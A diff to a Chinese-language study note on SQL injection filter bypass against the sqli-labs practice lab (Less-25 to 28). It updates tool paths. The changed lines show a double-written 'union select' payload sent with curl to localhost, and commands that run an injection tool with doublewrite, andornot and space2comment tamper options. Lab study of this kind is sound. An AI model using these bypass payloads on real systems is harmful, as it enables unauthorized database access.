@@ -4,7 +4,7 @@
 >
 > 总目录：[[../SQL总目录|SQL 总目录]] · 本目录 [[mysql结构总目录|mysql结构 总目录]]
 >
-> 工具箱：[[../../../../../hackingtools/web/README|hackingtools/web 工具箱]]
+> 工具箱：`~/hackingtools/web/injection/sqlinject`（工具库位于仓库外 `/home/a/hackingtools`）
 >
 > sqli-labs 对照：less-25、less-25a（and/or 过滤）、less-27/28（union select 过滤，双写同理）
 
@@ -366,21 +366,21 @@ curl -s "http://127.0.0.1/sqli-labs/Less-28/?id=0')%0auniunionon%0aseleselectct%
 
 ## 十、自动化：sqlinject.py 工具
 
-本章对应的命令已内置在工具中，路径 `~/hackingtools/web/injection/sqlinject.py`（用法详见 [[../../../../../hackingtools/web/README|hackingtools/web 工具箱]]）：
+本章对应的命令已内置在工具中，路径 `~/hackingtools/web/injection/sqlinject`（用法详见 `~/hackingtools/web/injection/sqlinject`（工具库位于仓库外 `/home/a/hackingtools`））：
 
 ```bash
 # and/or 过滤场景：doublewrite tamper 对应本章双写手法
-python3 ~/hackingtools/web/injection/sqlinject.py \
+python3 ~/hackingtools/web/injection/sqlinject \
   -u "http://127.0.0.1/sqli-labs/Less-25/?id=1" \
   --tamper doublewrite
 
 # 符号替代路线：and/or 转 && ||
-python3 ~/hackingtools/web/injection/sqlinject.py \
+python3 ~/hackingtools/web/injection/sqlinject \
   -u "http://127.0.0.1/sqli-labs/Less-25/?id=1" \
   --tamper andornot
 
 # 组合：双写 + 注释拆分（叠加空格过滤时）
-python3 ~/hackingtools/web/injection/sqlinject.py \
+python3 ~/hackingtools/web/injection/sqlinject \
   -u "http://127.0.0.1/sqli-labs/Less-25/?id=1" \
   --tamper doublewrite,space2comment
 ```
